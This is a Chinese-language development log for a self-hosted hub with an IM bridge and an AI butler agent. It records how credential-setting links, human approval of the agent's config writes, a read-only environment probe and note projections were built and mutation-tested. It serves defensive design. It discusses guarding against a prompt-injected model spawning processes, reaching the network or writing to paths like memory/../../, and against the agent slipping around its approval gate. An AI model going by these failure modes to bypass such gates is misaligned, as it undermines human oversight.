是发给一条 IM 绑定的。浏览器只是键盘，权威在 IM 身份。IMA 判例同形：一个粗粒度枚举值 + 细节
进 `metadata`，因为更细的字符串会在读侧被防腐守卫压成 `system`，**恰好丢掉它想记的那件事**。

真正承重的区分——这个秘密**有没有穿过聊天窗**——住在 `via`：直贴是 `im:<平台>`，表单是
`setkey-link`。一条门钉死这两条路永远不会变得分不出来；想改成加第七个枚举值的人，先读
`audit()` 头上那段，它写着一个读者会因此失去什么。

### 13.8 装配那条缝：M3a 发出去的时候其实是死的

M3a 的 `/setkey` 与 `/keys` 在**每一台** hub 上都答「未启用」，而所有单测全绿。

病因：`StartImBridgesOptions` 从没声明过 `credentials`，wiring 用条件展开
`...(x ? { credentials } : {})` 把它传进去——**展开会关掉多余属性检查**，编译器一声不吭，值落在
`opts` 上，而 `startImBridges` 从没把它拷进自己建的 `HostImConfig`。运行期
`config.credentials === undefined`。

两条教训：

1. **条件展开是类型系统上的一个洞，不是一种风格选择。** 要传可选字段，就把那个字段声明出来。
2. **一条缝，如果它的测试全都自己手搭对面那一半，那它就是没测过。** M3a 的测试手搭一个
   `HostImConfig` 直接调路由器：它们钉的是**分支**（那部分是对的），而没有任何东西钉**线**。
   修法不是补一句断言，是新开一份从 `startImBridges({ credentials })`——装配层自己走的那道
   门——进去的测试，并让它同时证明「没接线时仍答未启用」，否则上面那些断言可能是空洞地真。

**同一族的第二处，收口时跑 `pnpm -r typecheck` 才现形**：`examples/im-bridge-host/src/router.ts`
的穷尽 `switch` 从 M3a 起就没认过 `setkey` / `keys` 两个新 kind——**M3a 是带着一处全仓 typecheck
失败发出去的**，而每个包自己的测试全绿。这条编译期的门本来就是为这件事存在的（和 §13.6 里 web
那个 `const never: never` 一模一样的机制），它当时确实红了，只是**没有人去看**：那一刀跑的是包级
测试，没跑全仓 tsc。修法同 approvals 那一档并且更硬一点——例子里没有金库可写，就诚实答「这个
示例路由没接凭证命令」，而且这个分支**根本不读 `cmd`**，于是 key 结构性回显不出去，也永远掉不进
下面那条会记录并重放原文的自由文本派发。**教训：一刀收口前跑全仓 tsc，别只跑改到的那几个包**。

### 13.9 门

| 层 | 例数 | 钉住什么 |
|---|---|---|
| ① 解析（im-adapter） | 51（+6） | `/setkey link` 全形状认领（别名 / 大小写 / 多余空白）；`link` 不带值 |
| ② 存储 | 11 | 令牌不在文件名也不在正文（逐字节扫盘）；单次；发新的只废本人的；两处读都判过期且顺手清；坏形状在碰到路径之前就拒；坏记录读成「没有」而不是可用的；`setKeyLinkBaseUrl` 宁可拒不猜（无 `host:port` 回落、明文 http 只在回环） |
| ③ 服务 | 43（+13） | 页面是 peek 不是认领；两处各自重问角色；写给**令牌的主人**而不是提交者；形状检查在花掉之前、别的都在之后；picker 使 `ambiguous` / `vendor_ambiguous` 从表单够不到；**直贴与链接在审计里永远分得出来** |
| ④ 装配 | 6 | 接了就必须够得着（`/keys` 不答未启用、`/setkey` 带秘密到达、`link` 到达 `issueLink`）；没接仍答未启用（证上面那些不是空洞地真）；`handle.setKeyLink` 在场**当且仅当**链接真能用，且与聊天动词**是同一个实例** |
| ⑤ 路由（web） | 16 | 无 cookie / bearer / CSRF 可达；**挂在 CSRF 门之前**；秘密不出现在任何响应体（含重画表单那次）；每页零 `<script>`、`no-store`、`no-referrer`；八种拒因都渲染得出且都不带秘密；预算 / 405 / 413 都在碰到 surface 之前 |

三道变异三次全红、且**只红该红的那些**：`via` 改成 `'im:telegram'`（服务 2 例）／把秘密回显进
重试提示（路由 1 例，正是那条叫 THE PROMISE 的）／把挂载点挪到 CSRF 门之后（路由 1 例）。复原
一律精确文本替换 + `shasum` 对拍（**绝不 `git checkout <file>`**，八轮栽过）。

写门时踩的一个坑值得记：CSRF 那条控制**第一版断言 403 却拿到 503**，差点被判成「挂载点错了」。
真因是 `checkOrigin` 在 `allowedHosts` 缺席时直接 `return true`——那道门当时根本没开，503 来自
没接 identity。**一条通过了的控制断言，如果它守的门当时是关着的，它什么也没证明。** 改法=给那
一例显式配 `allowedHosts`，并且**先证那道门确实在拒别的路，再证这条路进得去**。顺带一条硬事实：
Node 的 `fetch` 会**静默忽略** `Host` 头覆盖，`node:http.request` 不会——按主机判定的门只能用
后者去撞（那也更像一次真的浏览器表单 POST）。

验收：host **3044**+5skip（+30），web **1662**（+16），im-adapter **51**（+6），四门 PASS（**旋钮 116 零新增**——
链接的地址复用 `GOTONG_PUBLIC_URL`（#111），那本来就是「外面怎么找到这台 hub」的答案，不必
再配第二样东西；main.ts 2789/2800、server.ts 2476/2490 各自显式抬并在门里写明理由）。

### 13.10 诚实残余

- **令牌就是凭证**：谁拿到那条 URL，谁就能在十分钟内往这台 hub 写一次 key（角色仍会被重问，
  所以他还得是那个够格的人）。回复里那句「它就是凭证，别转发」不是客套。转发一条链接比转发
  一把 key 危害小（单次、会过期、写不出别的东西），但不是零。
- 撤回原消息的 best-effort **仍未接**（M3a 记的那条）：直贴那条路只能靠提醒人手删。
- 链接页**不显示**任何已存 key 的值，只显示「这个槽位有没有」；也不做「测试连接」——那是
  MR-M5 的事，要花钱要打真端点。
- `linkBaseUrl` 缺席时整条路**诚实缺席**（`/setkey link` 说这台 hub 没有一次性链接并指回直贴 /
  网页），**不猜 `host:port`**：聊天窗里一条打不开的链接，比一句「做不到」更糟。
- 表单页是中英对照的静态文案（与 IM 回复同姿态），没有走 SPA 的 i18n——它不加载 SPA 的任何
  字节，那是它零 JavaScript 的代价，也正是它的目的。

---

## 十四、M3c 落地记录（2026-08-17）

M3a/M3b 把「换 key」搬上了手机。M3c 搬的是另一半：**改 hub 自己的基础设置**——四档表里
tier 2 的正主，用户拍板的姿态是「**每次 park**」，没有 blanket grant。

### 14.1 一台确定性的命令台，没有 task 可以挂

计划（§4.4）原本写的载体是 `/setting config-set K V` 这类命令行：先回一句「将改 X→Y」，
再 `/approve <短码>`。写门的时候撞上一条结构性事实，它把这个形态直接判死了：

**`InboxItem.itemId` 就是那个被挂起的 Task 的 id。** `HostInboxService.resolve` 拿短码找到
待批项之后，做的事是把**那个 task** 从 `suspended_tasks` 里捞出来续跑。而 `/setting` 是一条
零 LLM 的确定性命令行——它从头到尾**没有一个 task**。要让它 park，就得给收件箱另造一种
「没有 task 的待批项」，再给它另写一条 resolve 路径：**一道闸从此有两个执法点**。IMA 那一族
八轮 Codex 交叉审修的几乎全是「闸修好了、但闸两侧还有一条路绕过去」，再自己开一条平行的，
是明知故犯。

所以 M3c 的形态换成了**一件 governed 工具** `set_hub_config`：阿同本来就是一个会 park 的
参与者，它的每一次 governed 动作**天生**就是一个挂起的 task。命令台一步不动（IM 上遇到
config-write 仍然当场拒），手机上多的是**另一条**两步式的路。`SETTING-OPS-CONSOLE` 的改口
因此也写清楚了「改的是哪条路」，见那篇 §2.1。

### 14.2 第四个 surface 值，而不是借 `'im'`

`OpsSurface` 从 `'cli' | 'web' | 'im'` 加到四个值，新的那个叫 `butler`。

不复用 `'im'` 的理由不是洁癖：**同一个 park 项既可能在手机 `/approve` 上批，也可能在网页
`/me` 收件箱上批**——动作是同一个动作，批它的键盘可能是任意一个。写死任何一个渠道名，都有
一半的时候在撒谎。而渠道**本来就有人记**：收件箱 resolve 自己的审计行带 `metadata.via`
（IMA-M2），那才是「从哪按下去的」的权威。这里的 `surface` 回答的是另一个问题——**这次写是
谁发起的**，答案恒定是「阿同的 governed 动作面」。

加一个 surface 值的成本是零：`runnableOnSurface` 从来只 switch **tier** 不 switch surface，
唯一读 surface 的那处（`destructive-offline` 的 `caller.surface === 'cli'`）对 butler 已经
答对了。而闸也**不挂在这个名字上**——挂在 `allowConfigWrite` 旗标上，单测钉死：同样是
`surface:'butler'`，不带旗标照样抛 `OpsTierError`。名字只是审计里那行字。

### 14.3 classify 是同一套策略的**预检**，不是第二套策略

`classify` 里那五道判断（角色 → 有没有给 key → 是不是密钥键 → 在不在白名单 → 值合不合法）
**逐条镜像** `applyEnvKnob` 自己的顺序，一条不多一条不少。这不是重复实现，是把那套判断
**提前到 park 之前跑一遍**：

- 不提前跑，一次注定要被拒的动作也会先占掉人一次审批——tier 2「每次 park」的代价本来就高，
  拿它去问一个必然的「不行」是纯浪费（HANDS-M2 tier 2 联网命令先查配额，同一条纪律）；
- 顺序必须一致，否则「批准了」和「真的会落盘」之间会裂开：批准的时候说值合法，执行的时候
  另一套规则说不合法，人就会看到一次**批下去却没发生**的改动。

真正落盘的仍然只有一条路：`runOpsCommand('config-set', …)`。白名单、校验、审计动作
（`setting_config_write`）三件与网页/CLI 逐字同一份。

审计类型也是**复用** `SettingAuditSink` 而不是就地声明一个更松的——那个类型的 `actorSource`
是个闭集，第二个入口顺手把它放宽，等于把一道收窄过的门从背面重新打开。

### 14.4 它能在一行 IM 里批，理由是「它长不了」，不是「这行字短」

`set_hub_config` 进了 `IM_APPROVABLE_TOOLS`。写这条的时候特意把理由写进了名单旁边的注释，
因为它和 `hands_*` 留在网页侧的理由是**同一把尺子的两端**：

- `hands_*` 的参数是 argv，**想多长有多长**。今天它们在手机上显示不全，是因为那把尺子恰好
  量不下——把 agent id 改短、把框架那句话缩一缩，这道门就会**静默**打开。安全属性不能挂在
  显示长度上，所以它们被**列举**在名单之外。
- `set_hub_config` 的参数空间是**封闭的**：4 个具名键（`enum` 就是 `ENV_KNOBS` 派生的）、
  值是枚举或端口号、`additionalProperties: false`。它渲染出来的那一行**结构上就长不了**，
  也长不出自由文本。

这条推理有一道门守着：`枚举 ≡ ENV_KNOBS` 的断言。有人往 `ENV_KNOBS` 加一个自由文本旋钮而
schema 手抄名单没跟上，门就红；变异测试把枚举写死成一份手抄名单，恰好红那一例。

（Codex 九轮 H1 立的规矩在这里第一次被新工具**正着用**了一遍：名单是**列举**，新工具的默认
答案是「不在名单上」，往里加一个名字 = 明确宣称「这个动作在一行 IM 里读得全」。
`butler-tool-tiers.test.ts` 的双向核对同刀跟上：13 个 governed 工具，每个恰好落一侧。）

### 14.5 一个装饰性的读盘失败，不该从闸里炸出去（写门时挖到的）

审批卡上有一句「现在配置文件里是 3000 / 当前进程在用 9000」——纯粹是给人看的注解。第一版
它是这么取的：

```ts
const view = (await ops.knobs()).find((k) => k.key === key)
```

读了 `GovernedActionToolset.classify` 的源码才发现：**它对分类器抛出的东西不设 catch**。于是
一次磁盘打嗝会从闸里炸出去，而「这个改动该不该问人」这个判断，本来一个字节都不依赖那句注解。

修法是给它一个**承重的** try/catch + 一行 warn，注释里写明这道 catch 不是防御性编程。变异
测试把 catch 摘掉，恰好红一例（`现值读不到 ⇒ 照样 approve，只是少一句`）。

另一条同类的教训在同一批门里：我先写了个「读不动 ⇒ 空数组」的断言，跑出来是红的——因为
`readEffectiveConfig` **根本不抛**，一个还没写过的 `gotong.env` 是诚实的「四个键都在、
`fileValue` 全是 null、默认值在」。**门变红时先确认自己断言的是不是真话**（Codex 七轮同款），
这次是我的断言错，改成钉住那个真实行为。

### 14.6 门

`personal-butler-config.test.ts` **24** 例，六组：工具面与参数空间（枚举 ≡ `ENV_KNOBS` / 必填 /
`additionalProperties:false` / 在 IM 可批名单上 / 描述里点名 `/setkey` 与价格另有其人）；classify
预检（角色在最前，**参数再坏也先答角色** / 密钥键指 `/setkey` 而**不是**「不是可改的设置项」/
未知键把四个可改项列全 / 坏值把原样回显进理由 / `' 8080 '` 归一后 approve 且理由含 8080 与
「重启」/ 现值两行 / 读现值失败照样 approve 且不泄漏内部错误文本 / 未知工具名 refuse）；describe
（逐字断言那一行 + 最长的合法一行 < 80 码点，即 IM 一行预算内）；execute（`ops.set` 收到的
参数逐字段 / park→批准之间被降权 ⇒ `isError` 且 `ops.sets` 仍是空 / 写失败把 ops-core 的话
原样传出去）；**真 ops**（真 owner 判定 / 真写 `<space>/gotong.env` + 恰好一条审计行 /
审计抛错**不回滚**已落的字节 / `knobs()` 反映盘上的 8080 / 全新 hub 四个键 `fileValue` 全 null）；
surface（`butler` 不带 `allowConfigWrite` ⇒ `OpsTierError` —— **闸挂在旗标上不挂在名字上** /
IM 拒绝文案含 `/approve` 与「阿同」/ 枚举里没有 `PRICE`）。

`butler-tool-tiers.test.ts` 同步：`GOVERNED_TOOLS` 13 个名字，双向核对每个恰好落
「IM 可批」或「网页 only」一侧；最大脸的 fake 补上 `configOps`。

**五道变异五次全红，且每次只红该红的那一例**：摘 classify 的 catch（1 例）/ 角色闸挪到值校验
之后（1 例）/ 从 `IM_APPROVABLE_TOOLS` 摘掉 `set_hub_config`（2 例，跨两个测试文件）/ 摘掉
execute 侧的降权复查（1 例）/ schema 枚举写死成手抄名单（1 例）。复原一律 python 精确替换 +
`shasum` 对拍基线，**绝不 `git checkout <file>`**（八轮栽过）。

排错记：复原第二道变异时，锚点 `const key = normKey(args.key)` 在文件里出现 **3 次**
（classify/describe/execute 各一），`mut.py` 的「锚点必须恰好出现一次」当场拦下——那个断言是
八轮「变异测试自己也要验证它真的只改了想改的那处」的直接产物，这次它救了一手。

### 14.7 诚实残余

- **owner/admin 才有这件工具的执行权**，判定与 `pack_backup` / 手 A 同源（服务端权威，classify
  与 execute 各问一遍）。但工具面**不**问——只有一件工具、参数是封闭枚举，省不出多少 token，
  而让 classify 的拒绝把「只对 owner/admin 开放」当着人的面说出来，好过一件工具凭空不存在
  （这与手 A 刻意相反：那边五件工具的 schema 对一个永远被拒的人是白付的）。
- **写的是下次启动才读的文件**。回复里那句「下次重启这台 hub 时生效」不是免责声明，是这条路
  的全部语义——host 没有通用运行时热重载（`SETTING-OPS-CONSOLE` §五的事实核查至今成立）。
- **`config-price`（`pricing.json`）没上这条路**：它的参数是自由形状的价格表，撞的正是 14.4
  那条「参数空间封闭」的理由。要上得先想清楚一行 IM 怎么把它说全。
- **`/setting` 命令台仍然一步式**，理由是 14.1 那条结构性的，不是「以后再说」。
- 审计行里 `actorSource` 是 `v4-session`（发起人是一个真的 v4 用户行），**批准的渠道**由收件箱
  自己那条 resolve 审计行的 `metadata.via` 记——两行拼起来才是完整的一次改动，这是刻意的分工。
- Codex 交叉审**尚未跑**（额度 08-19 恢复），与 M2/M2b 同批送审。

---

## 十五、M4 落地记录（2026-08-17）

一句话：**这台机器什么样、够不够用、有什么该改** 折成一次只读调用 —— 而「该改」里真轮得到
阿同动手的，只有一件，因为 hub 是非特权跑的，这是特性不是缺陷。

### 15.1 M4 不需要第二条落盘路（这一刀最重要的判断）

计划原文把 M4 写成「提案卡 + **tier 2 应用**」，读起来像要再造一条应用路径。落地时先把
「哪些环境问题阿同真的能自己修」一条条过了一遍，答案是：**几乎没有**。

装 ffmpeg、装 bwrap、清磁盘、改防火墙 —— 全要包管理器 / root，而 hub **刻意**是非特权跑的
（威胁模型 §二把 `apt` / `systemctl` 结构上做不到当**特性**写着）。「关 embedder / 关图书馆员
省内存」倒是不需要 root，但那几个旋钮**不在 M3c 那四个可改设置项的白名单里** —— 一张环境卡
要是为了让自己的建议能一键落地，顺手把那张白名单撑宽，那才是真出事：**白名单该不该长，是一个
独立的决定，不能被一张诊断卡顺带做掉**。

于是真正 `applicable:true` 的只剩一条：**`GOTONG_WEB_PORT` 与 `GOTONG_WS_PORT` 被写成了同一个
值**。这条来自 M3c 自己 —— `validatePort` 只查 1..65535 的范围，不查两个端口撞不撞，所以手机上
一句「把网页端口改成 3000」就能造出「下次重启起不来、而现在跑着的进程毫无感觉」的状态。**M3c
造出了这个失败模式，M4 负责在它炸之前看见它**；修法落在 `set_hub_config` **已有**的参数空间里，
一个字节的新落盘路径都不需要。

这条提案还有一支**降级**：如果活着的值也已经撞上了（两边都被改过），阿同算不出一个确定不撞的
值，就别假装能一键修 —— 降级成只指路，挑端口是人的决定。

判别联合把这件事钉死在类型上：`applicable:false` 那一支**根本没有 `apply` 字段**。一条只该指路
的建议想夹带一个能落盘的动作，结构上没有地方放。门里对每一条提案反向断言
`hasOwnProperty('apply') === false`，因为运行时的越权不该只靠编译器拦。

**为什么不复用 RES 的 `AdaptationProposal`**：那个联合的 apply 路径写死在「agent 编辑 →
`agents.json`」（`agents-routes.ts` → `adaptEditBodyFromProposal` → `space.upsertAgent`），一条
环境类提案送进去只会拿到 400 `not_applicable` —— 复用它等于让类型撒一个谎。

### 15.2 三种「不探」，每种都有各自的理由

- **监狱不重探**。别处可以拿 PATH 上有没有那个文件当答案，这一行不行：`detectFsJail` 是
  **功能**探针（真 spawn 一次试着关进去），而「PATH 上有 bwrap」≠「这台机器上能用」——
  Ubuntu 23.10+ 的非特权 userns 可能被 AppArmor 关掉，那正是威胁模型里如实写着的残余。所以
  这一行读 boot 时定下的 `ButlerHandsStatus`，自己一个字也不判；没手时**原样带上 boot 那次的
  原因**，再补一句「装监狱要包管理器权限，我自己装不了」。
- **出网不主动探**。一个模型能触发的出站请求，本身就是一个新的出网面（WSE / LSA 一路守下来的
  边界）。改成读 CARE 那份从**真实流量**折出来的断供投影，并在卡上写明「被动看，不主动探」
  —— 「没人报过错」不等于「探过是通的」，这句话必须让读卡的人看见。另外只有 `network` 类断供
  算环境问题：配额耗尽 / key 过期不是这台机器的事，把它们算进来会把人指向错误的方向。
- **版本号不取**。工具链只看 PATH 上那个文件在不在（`existsSync`），**绝不跑 `--version`**
  —— 与 resource-inventory 同一条纪律：一个能被注入的模型触发的进程，不该因为「想知道版本号」
  而存在。门把这条升成**源码级断言**：剥掉注释后，这个文件里不许出现 `child_process`、
  `spawn(`、`execFile`、`fetch(`、`node:http`（注释里可以谈这件事，代码里不许写 —— 与 innerHTML
  那道门同姿态）。

### 15.3 每一块读不动，都只让那一块沉默

采集分四块（机器 / 工具链 / 旋钮 / 体检），逐块 try/catch，一块读不动只让那一块是 null，卡照出
（`my_status` 六行逐行降级同纪律）。三条具体的诚实：

- **null ≠ 有问题**。读不动的块**不产生任何提案** —— 一张「什么都读不到」的卡，提案清单是空的，
  而不是把「我看不见」渲染成「你有一堆毛病」。
- **磁盘探不动不当成 0**。`statfsSync` 是 Node 18.15+ 才有的，老运行时上诚实回 null；把 null
  当 0 会让每一台老机器都收到一条「磁盘快满了」。
- **未接与读不动分得开**。旋钮面没接是 `null`，接了但读盘失败也是 `null`，而体检那格用三个值
  分开说（`'not_wired'` / `'unknown'` / 真值）—— 因为「没接断供监测」和「断供监测说没事」在
  屏幕上必须是两句话。

**敏感事实是结构性缺席的，不是采完再脱敏**：绝对路径 / 主机名 / 用户名 / 任何 env 的**值**一律
不进采集面（`spaceDir` 只交给 statfs，永不进输出），渲染器想泄露也拿不到。门真跑一遍默认探针
再断言输出里不含 `process.cwd()`、不含 `/usr/bin`、不含 `$USER`。

### 15.4 它落在目录层，不占每轮的脸

`hub_environment` 进 `BUTLER_DIRECTORY_BENIGN`（与 `hub_health` / `my_status` / `restart_history`
同族）：出事才问，不是每轮动词。它的提案会点名 `set_hub_config` —— 而那件是 **governed**，按
AFR-M3 的规则全量留一等，所以「指路不指空」成立。AFR-M1 报告量到 622 字节 / ~193tk（在目录后面，
每轮的脸一个字节没长）。

`list_my_capabilities` 里刻意分成**两条** signal：环境卡永远在（机器事实这块总探得到），而
「我能帮你改基础设置」那句话由 `set_hub_config` 在不在决定 —— 合并成一条就会在没接 M3c 的
hub 上许一个做不到的诺。

### 15.5 门

新 `personal-butler-environment.test.ts` **30 例**六组：工具面与只读契约（含上面那条源码级断言）/
采集逐块降级 / 提案引擎纯函数（端口撞车两支、待生效、没手、工具链、内存、磁盘、出网七类）/
判别联合承重（凡 `applicable:true` 其 `apply.tool` 恒为 `set_hub_config` 且 key ∈ 四个白名单旋钮；
凡 `applicable:false` 结构上没有 `apply`）/ 渲染（逐行降级 + 敏感事实结构性不出现）/ **真实默认
探针自己也跑一次**（生产走的就是那条路，只测注入的假探针等于没测过它）。

**七道变异，七次全红，且每次只红该红的那些**：给「不可应用」那支夹带一个 `apply`（④ 1 例）/
端口撞车不再降级（③ 1 例）/ 磁盘 null 当 0（③ 1 例）/ 渲染顺手打印 `process.cwd()`（⑤ 1 例）/
源码里出现一个 `fetch(`（① 1 例）/ 从 `BUTLER_DIRECTORY_BENIGN` 摘掉 `hub_environment`
（tiers 门 2 例，双向都红）/ 从 AFR-M1 `MEASURED_BUILDERS` 摘掉它（tripwire 2 例，报出的正是
「factory 组装了它但报告没度量它」）。复原一律 python 精确替换 + `shasum` 与基线对拍，**绝不
`git checkout <file>`**。

验收：host **3098** + 5 skip（+30）、全仓 `pnpm -r typecheck` 净、四门 PASS（**旋钮 116 零新增**
—— `spaceRoot` 是 factory 的 dep 不是旋钮；main.ts 2801，棘轮 2800→2810 **显式抬**并写明理由：
上一刀已经顶格，继续靠压注释续命正是那道门头注警告的事）。

### 15.6 诚实残余

- **`applicable:true` 只有一条**，而且它治的是 M3c 自己造出来的失败模式。这不是设计得不够 ——
  是「hub 非特权」这条立场的直接后果：环境问题的修法绝大多数在 hub 的权限之外，阿同能做的就是
  **准确地说清楚该谁做什么**。
- **探针看不见 hub 自己的资源占用**（`os.freemem()` 是整台机器的）。要报「阿同这个进程吃了多少」
  得另开一条路，那是 metrics 的事，不是这张卡的。
- **端口撞车只查这一对**。别的占用（另一个进程已经占着 3000）探不到 —— 探它就得真去 bind，
  那是副作用不是探测。
- **提案不落审计**。渲染一张卡不是一次动作；真要改，落盘的那一下由 `set_hub_config` 自己记
  （M3c 的 `setting_config_write` 行）。
- **磁盘只看空间所在那块盘**。备份档 / transcript 若被配到别的挂载点上，这张卡看不见它满没满。
- Codex 交叉审**尚未跑**（额度 08-19 恢复），与 M2/M2b/M3a/M3b/M3c 同批送审。

---

## 十六、M5 落地记录（2026-08-19）

一句话：**打开这个目录，人能读懂阿同记着什么、在做什么** —— 而这些 md 一个字也不会被读回去，
它们是派生物，不是第二份真相。

### 16.1 投影里一个 `Date.now()` 都不能有（这一刀最重要的判断）

计划里没写这条，但它决定了整个实现的形状。投影每 6h 兜底重写一次；只要正文里塞一个墙上时钟
（「生成于 2026-08-19 14:03」这种一看就该有的东西），MU-M5 的记忆树 git 快照就会**每一次 tick
都看到 diff**：`snapshotMemoryTree` 的判据是 `git status --porcelain`，没变化就 no-op，而一个每次
都不同的时间戳会把「什么都没变」渲染成「变了」。开了那个旋钮的成员，一年 1400 个空 commit，真正
的改动埋在里面找不到。

所以：**投影里的时间戳只能来自真相自身**（任务的 `createdAt` / 事实的 `ts`，都是真相里本来就有的
字节），`now` 只用来**选**哪些条目进得来（`isActive` 判这条事实现在还成不成立），永远不进输出。
同一份真相渲染两次必须逐字节相同 —— 门里拿两个相差一天的 `now` 各渲染一次，断言字节相等。

这条升成**源码级断言**（与 M4 的只读契约同姿态）：剥掉块注释与 `//` 行之后，本文件里不许出现
`Date.now` 或 `new Date()`。**注释里可以谈，代码里不许写**。

一个刻意的例外：`STATUS.md` 里那条时间戳是对的 —— 它记的是「维护**跑过**」这件事，时间就是它的
全部内容；投影记的是**状态**，状态不该带表。

### 16.2 三条边上的判断

- **文件名只能来自闭集**。`memory/<cluster>.md` 的 cluster 来自 `meta.tier`，那是蒸馏**模型写的
  自由字符串** —— 直接拿去拼路径，一次幻觉就能写到 `memory/../../` 去。故一律先过 `normalizeTier`
  压回目录里的已知 id，再过 `isSafeTierId`（小写字母/数字/`-`/`_`，≤32）；不合形状的 cluster
  **跳过并 warn**，绝不「尽力拼一个」。两道是分工不是重复：前者防模型，后者防目录本身被人配坏
  （自定义 `TierConfig`）。
- **链只指真实存在的文件**。`[[knowledge/…]]` 只在这个成员的书架上**真的有那个文件**时才生成
  （`archive/` 下的不算——归档过的笔记不该被任务卡拽回台前）。Obsidian 里的死链不是「点了没反应」，
  是**点了就新建一个本不该存在的笔记** —— 与 M3b 那条「指一条可能不存在的路，比说『这儿干不了』
  更坏」同一形状。链表读不到（知识库连不上）时降级成不带链，投影照出。
- **frontmatter 里不放自由文本**。值只有布尔、整数和固定标识符。任何一个带冒号的任务标题塞进去
  都会把 YAML 撑坏，而 Obsidian 解析失败时是**整块 frontmatter 悄悄消失** —— 里程碑要的「投影可
  Obsidian 解析」会以最安静的方式失效。自由文本一律进正文，且**压成一行**（`oneLine` 把换行与
  控制字符换成空格）：一条被注入的「事实」于是伪造不出 `## 事实` 这样的小标题。

### 16.3 写前比字节；空了就删

`writeIfChanged` 先读旧字节，一样就**一个 syscall 都不发** —— 这是 16.1 那条判断的下半场：没有
墙上时钟保证了「内容没变 ⇒ 字节没变」，比字节保证了「字节没变 ⇒ 盘不动」，两条合起来 git 快照才
真的安静。门里量的是 mtime：同一份真相投两次，第二次之后 mtime 一个纳秒都没动。

某个 cluster 一条活着的事实都不剩时，**删掉那个文件**而不是写一个空的 —— 一个留在盘上的空投影会
让人以为那些事实还在。`forget-all` 同罪：`removeMemoryProjections()` 与 DREAMS/SKILL/STATUS 一起
清（一份被要求忘掉的事实，不该还在 vault 里摆着、还看起来像现状）；`memory/` 目录只在**空**的时候
才 rmdir，人自己往里放的东西不动。

### 16.4 两条生成路径必须产出同样的字节

`tasks.md` 走**写路径末尾**（`openTaskNotebook` 那个唯一的 `save()` 咽喉，`onSaved` 钩子），
`memory/*.md` 走 **6h 维护兜底**（语义事实本来就只在蒸馏那一刻变；跟着每一次 capture 走只是白写盘），
而 6h 那一趟会把**两块都重投一遍**。

于是有个真实的漂移风险：同一个 `tasks.md`，写路径投一次、维护路径再投一次，两边要是各自组装
projector（各自算 vault 目录、各自决定要不要接知识库链表），迟早会不一样，而那天没有人会被通知。
修法是**结构性**的：两条路都调 `openButlerObsidianProjector()` 这**一个**工厂，它是「这个成员的
投影器长什么样」的唯一答案。门不满足于「两边都调了同一个函数」，而是真跑两条路，断言维护那一趟
写出来的 `tasks.md` 与写路径那一趟**逐字节相同**。

投影失败只 `warn`：真相已经落盘了，派生物写不出来不该让成员的一次任务编辑失败（与 STATUS.md 同
姿态）。`projectTasks` / `projectMemory` 结构上 never-throws。

### 16.5 门

- 纯核 `obsidian-projection.test.ts` **30 例**六组：frontmatter 闭集 / 渲染确定性（含源码级
  `Date.now` 断言、两个不同 `now` 渲染逐字节相同）/ cluster 名闭集（敌意 `meta.tier` 落回 misc、
  坏目录 id 跳过并 warn）/ 知识库链（只连真在架上的、`archive/` 不连、最长匹配、单扫不用正则）/
  自由文本压成一行（换行与控制字符换空格、伪造小标题变不成标题）/ 写盘（字节没变 mtime 不动、
  空 cluster 删文件）。
- 装配门 `butler-obsidian-wiring.test.ts` **5 例**：**真** `buildButlerFactory` + 真
  `runButlerMaintenanceOnce` + 真 `HostButlerMemoryService.forgetAll` 全走一遍 —— 这是 M3b 那条
  教训的直接产物（**一条缝，如果它的测试全都自己手搭对面那一半，那它就是没测过**）。断言：写完
  笔记本 vault 根就出现 `tasks.md` 而 `tasks.json` 仍是真相 / 链只在架上真有那篇时才连 / 维护那趟
  的 `tasks.md` 与写路径逐字节相同 / forget-all 清掉 `memory/*.md` 但**不碰** `tasks.md` /
  STATUS.md 里那句覆盖提醒在。

**九道变异，九次全红，且每次只红该红的那些**：往 frontmatter 塞 `rendered_at: Date.now()`（4 例，
源码断言 + 渲染确定性 + frontmatter 闭集 + mtime）/ `normalizeTier` 换成裸 `tierOf`（1 例）/ 摘掉
`isSafeTierId` 那道跳过（1 例）/ 链表不再排除 `archive/`（1 例）/ 去掉 `if (current === body) return`
（1 例）/ 空 cluster 留着旧文件（1 例）/ `oneLine` 不再折控制字符（2 例）/ 工厂不传 `onSaved`
（3 例）/ 维护不调 `projectButlerVault`（2 例）/ `forgetAll` 不清记忆投影（1 例）。复原一律 python
精确替换 + `shasum` 与基线对拍，**绝不 `git checkout <file>`**。

**排错记**：删除型变异的复原被 `mut.py` 的「锚点必须恰好出现一次」当场拦下 —— 变异后的「新」侧是
一个**空串**，而空串在任何文件里都出现上万次。那道守卫是八轮变异测试的直接产物，这次它拦下的是一次
会把整个文件搅烂的复原。教训：**删除型变异要在「新」侧留一个非空且唯一的标记**（一行注释即可）。

验收：personal-butler **216**（+30）、host **3103** + 5 skip（+5）、全仓 `pnpm -r typecheck` 净、
四门 PASS（**旋钮 116 零新增** —— 投影不是开关，它跟着 vault 一起在；`main.ts` 未触碰）。

### 16.6 诚实残余

- **记忆投影读到 500 条为止**。这不是我们挑的数，是文件后端 `list` 自己的 `LIST_MAX_LIMIT`
  —— 与其许一个后端兑现不了的诺，不如照它的上限取最新的 500 条，并在正文里写明「还有 N 条没有
  列出，完整数据在 `semantic.jsonl`」。真相一条不少，投影是有界的。
- **投影只出不进**。人在 `tasks.md` 里打的字不会被读回去，下次写入直接覆盖 —— 这是岔口 4 的全部
  语义，不是待补的功能。要改内容跟阿同说（或直接改 `knowledge/`，那不是投影）。
- **`forget-all` 不删 `tasks.md`**。那是笔记本的投影不是记忆的；任务本身还在 `tasks.json` 里，
  连带删掉会把「忘掉关于我的事实」悄悄扩成「删掉我的待办」。
- **只投当下成立的事实**。被后来的说法翻篇的旧事实不在投影里（它们仍在 jsonl 里 —— 记忆不删只
  翻篇）；想看全史只能读 jsonl。
- **episodic 不投**。每轮捕获的原话是流水不是状态，投出来只会淹掉那几条真正的事实。
- Codex 交叉审**尚未跑**（额度 08-19 恢复），与 M2/M2b/M3a/M3b/M3c/M4 同批送审。

---

## 十七、M6 落地记录（2026-08-20）

一句话：**这一刀几乎没有代码**——host 侧读 env 的能力从 DEPLOY-B1 起就在，缺的只是两份
compose 从来没把那些变量端进容器。所以 M6 的全部内容是「把一条早就通的路在部署文件里说出来」，
外加一条把它钉住、且将来不会跟源码漂移的门。

### 17.1 `/model` 不存在，而且不该造（这一刀最重要的判断）

M6 的验收行原文写的是「手机 `/setkey`→`/model` 全通」。落地前先去找 `/model`——
`packages/im-adapter/src/command-parser.ts` 认领 help / bind / unbind / agents / workflow /
inbox / approve / deny / setkey / keys，**没有 `/model`**。

